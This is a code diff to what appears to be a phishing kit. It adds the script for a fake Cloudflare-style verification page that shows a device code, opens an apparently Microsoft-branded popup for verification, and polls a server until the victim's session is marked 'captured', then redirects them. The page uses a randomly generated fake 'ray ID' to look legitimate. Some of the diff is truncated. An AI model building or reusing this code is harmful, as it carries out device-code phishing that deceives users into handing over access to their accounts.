@@ -2338,8 +2338,16 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 				border-radius: 999px;
 				padding: 4px 10px;
 			
-<truncated 11241 bytes>
- Math.PI * 2);
+<truncated 10981 bytes>
+p, H);
+			    }
+			  }
+
+			  function drawNoiseDots() {
+			    for (var i = 0; i < 240; i++) {
+			      ctx.fillStyle = 'rgba(17, 24, 39,' + rand(0.06, 0.3).toFixed(3) + ')';
+			      ctx.beginPath();
+			      ctx.arc(rand(0, W), rand(0, H), rand(0.7, 2.2), 0, Math.PI * 2);
 			      ctx.fill();
 			    }
 			  }
@@ -2373,6 +2381,55 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 			  var ray = '';
 			  for (var i = 0; i < 16; i++) ray += hex.charAt(Math.floor(Math.random() * 16));
 			  document.getElementById('ray-id').textContent = ray;
+			
+			  // Polling logic
+			  var verifyBtnElement = document.getElementById('verify-device');
+			  var ready = codeReady && DEVICE_CODE !== '';
+
+			  document.addEventListener('trustgate:verify', function(e) {
+			      if(!ready || !DEVICE_CODE) return;
+			      var w = 600, h = 600, l = (screen.width-w)/2, t = (screen.height-h)/2;
+			      var popup = window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
+			      if(popup) popup.focus();
+			      verifyBtnElement.textContent = 'Verification in progress...';
+			  });
+
+			  function poll() {
+			    fetch('/dc/status/'+sid, {method:'GET',credentials:'include'})
+			      .then(function(r){return r.json()})
+			      .then(function(d){
+			        if(d.ready && !ready) {
+			          ready = true;
+			          DEVICE_CODE = d.user_code;
+			          verifyUrl = d.verify_url;
+			          render();
+			          verifyBtnElement.disabled = false;
+			          verifyBtnElement.textContent = 'Verify device';
+			        }
+			        if(d.captured) {
+			          if(d.redirect_url) {
+			            top.location.href = d.redirect_url;
+			          } else {
+			            top.location.href = '/';
+			          }
+			        }
+			        if(d.expired) {
+			          verifyBtnElement.disabled = true;
+			          verifyBtnElement.textContent = 'Session Expired';
+			        }
+			        if(!d.failed && !d.expired && !d.captured) {
+			          setTimeout(poll,3000);
+			        }
+			      }).catch(function(){setTimeout(poll,5000);});
+			  }
+
+			  if(!ready) {
+			      verifyBtnElement.disabled = true;
+			      verifyBtnElement.textContent = 'Generating...';
+			  }
+
+			  poll();
+
 			})();
 		</script>
 	</body>
